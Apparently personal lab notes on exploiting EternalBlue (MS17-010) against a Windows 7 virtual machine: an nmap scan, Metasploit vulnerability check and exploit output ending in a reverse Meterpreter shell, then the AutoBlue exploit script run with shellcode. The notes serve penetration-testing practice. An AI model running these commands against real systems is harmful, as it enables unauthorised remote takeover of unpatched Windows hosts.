- nmap -p- -A -T4 192.168.1.19
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2025-10-30 13:50 UTC
Nmap scan report for WIN-845Q99OO4PP.realtek (192.168.1.19)
Host is up (0.0022s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:2A:95:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 1 hop
Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|*nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:95:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2025-10-31T01:51:22
|*  start_date: 2025-10-31T01:46:07
| smb-os-discovery:
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-30T21:51:22-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|*clock-skew: mean: 13h19m59s, deviation: 2h18m33s, median: 11h59m59s
| smb2-security-mode:
|   2:1:0:
|*    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   2.18 ms WIN-845Q99OO4PP.realtek (192.168.1.19)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.00 seconds

- msfconsole - search eternalblue
- msf auxiliary(scanner/smb/smb_ms17_010
- msf auxiliary(scanner/smb/smb_ms17_010) > run
[+] 192.168.1.19:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.1.19:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
- msf exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 192.168.1.15:4444
[*] 192.168.1.19:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.19:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.19:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.19:445 - The target is vulnerable.
[*] 192.168.1.19:445 - Connecting to target for exploitation.
[+] 192.168.1.19:445 - Connection established for exploitation.
[+] 192.168.1.19:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.19:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.1.19:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.1.19:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service
[*] 192.168.1.19:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1

[+] 192.168.1.19:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.19:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.19:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.19:445 - Starting non-paged pool grooming
[+] 192.168.1.19:445 - Sending SMBv2 buffers
[+] 192.168.1.19:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.19:445 - Sending final SMBv2 buffers.
[*] 192.168.1.19:445 - Sending last fragment of exploit packet!
[*] 192.168.1.19:445 - Receiving response from exploit packet
[+] 192.168.1.19:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.19:445 - Sending egg to corrupted connection.
[*] 192.168.1.19:445 - Triggering free of corrupted buffer.
[*] Sending stage (230982 bytes) to 192.168.1.19
[+] 192.168.1.19:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.19:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.19:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (192.168.1.15:4444 -> 192.168.1.19:49159) at 2025-10-30 14:03:17 +0000

meterpreter >

- cd /opt/ git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
- python3 -m venv myenv
- source myenv/bin/activate
- `pip install -r requirements.txt`
- 

![image.png](attachment:72dd42af-f22d-4fa4-97f2-669638f84de5:image.png)

- 

![image.png](attachment:3b8eb652-a7c9-4c99-95ed-6409a87a3d8a:image.png)

- Open new terminal - cd /opt/AutoBlue-MS17-010
- python eternalblue_exploit7.py 192.168.1.19 shellcode/sc_all.bin
shellcode size: 2307
numGroomConn: 13
Target OS: Windows 7 Ultimate 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
- Result of Eternalblue attack
